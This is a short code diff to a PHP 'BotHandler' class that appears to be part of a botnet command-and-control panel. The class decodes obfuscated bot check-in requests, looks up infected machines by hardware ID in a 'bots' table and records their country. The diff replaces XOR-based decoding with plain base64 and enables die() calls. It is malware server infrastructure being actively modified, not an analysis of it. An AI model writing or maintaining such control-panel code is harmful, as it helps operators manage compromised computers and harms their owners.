@@ -53,11 +53,10 @@ class BotHandler
         //Decrypt Main Requests
         if (!empty($_POST["request"])) {
 
-            $signal = base64_decode($this->xor_this(base64_decode($_POST["request"])));
+           // $signal = base64_decode($this->xor_this(base64_decode($_POST["request"])));
+            $signal = base64_decode(base64_decode($_POST["request"]));
 
             parse_str($signal, $postbot);
-
-
 
             $botfound = false;
             $bot = "";
@@ -79,6 +78,8 @@ class BotHandler
                 $countryLongitude = "";
                 $countryName = "";
             }
+
+
 
 
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
@@ -219,11 +220,12 @@ class BotHandler
 
             }
             //echo "waiting";
-            //die();
+            //
+            die();
         }
 
 
-        //die();
+        die();
 
 
     }
